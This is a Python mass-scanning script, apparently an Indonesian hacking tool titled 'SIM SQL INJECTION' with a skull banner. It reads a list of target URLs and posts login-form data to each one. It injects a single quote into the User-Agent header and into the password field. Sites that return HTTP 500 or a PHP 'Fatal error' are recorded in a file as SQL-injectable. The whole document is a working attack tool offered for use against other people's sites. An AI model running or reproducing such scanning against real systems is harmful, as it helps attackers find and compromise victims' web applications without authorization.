import os
import requests
import sys
import re
from urllib.parse import urlparse

class c:
	res     = "\33[0m"
	b      = "\33[1m"
	r       = "\33[31m"
	g     = "\33[32m"
	y    = "\33[33m"

def clear():
    if sys.platform.startswith("linux"):
        os.system('clear')
    elif sys.platform.startswith("freebsd"):
        os.system('clear')
    else:
        os.system('cls'
                )
def BanSim():
    clear()
    print(c.b + """
                          ______
                       .-"      "-.
                      /            \               
                     |,  .-.  .-.  ,|
                     | )(_"""+ c.b + c.r +"""o""" + c.res + c.b +"""/  \"""" + c.b + c.r +"""o""" + c.res + c.b +"""_)( |
                     |/     /\     \|
           (@_       (_     ^^     _)
      _     ) \_______\__|IIIIII|__/_________________________
     (_)@8@8{}<________|-\IIIIII/-|__________________________>
            )_/        \          /
           (@           `--------`
           
           Coded by root@x-krypt0n-x | System of Pekalongan
                        SIM SQL INJECTION""" + c.res)

post_data = {"usr": "a", "pwd": "a", "FBD": "Masuk"} # post data yang akan dikirim ke server
param = {"user-agent": "Mozilla/5.0 (X11; Othros Linux System of Pekalongan x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'"} # user-agent yang terinjeksi ' untuk mentrigger error 500}
post_data2 = {"usr": "a", "pwd": "a'", "FBD": "Masuk"} # post data yang terinjeksi ' untuk mentrigger error
param2 = {"user-agent": "Mozilla/5.0 (X11; Othros Linux System of Pekalongan x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"} # user-agent yang tidak terinjeksi
    
BanSim()
Target = open(input("[*] List:~# "), 'r')
    
def Exploit(Target):
    #Target_Sim = open(input("[*] List:~#"), 'r')
    for url_list in Target:
        url_list = url_list.strip()
        url_parse = urlparse(url_list)
        
        try:
            p = requests.post(url_list, data=post_data, headers=param)
            p2 = requests.post(url_list, data=post_data2, headers=param2)
            
            pattern = "<b>Fatal error</b>"
            content = str(p2.content)

            if p.status_code == 500:
                print(c.b + c.g + "[*] "+ url_list +" | Vuln SQL Injection in user-agent" + c.res)
                with open("sim_sqli_vuln.txt", 'a') as w:
                    w.write(url_list + '\n')

            elif (re.search(pattern, content)):
                print(c.b + c.g + "[*] " + url_list +" | Vuln SQL Injection in pwd paramater" + c.res)
                with open('sim_sqli_vuln.txt', 'a') as w:
                    w.write(url_list + "\n")

            else:
                print(c.b + c.r + "[!] "+ url_list +" | Not Vuln" + c.res)

        except KeyboardInterrupt:
            print(c.b + c.r + "[!] exit" + c.res)
            sys.exit(1)

print(c.y + "\n[*] output will save in" + c.b +" sim_sqli_vuln.txt" + c.res)
Exploit(Target)
count_sim = len(open("sim_sqli_vuln.txt").readlines())
print(c.b + c.g + "\n[!] "+ str(count_sim )+ " Site vuln with SQL Injection"+ c.res)
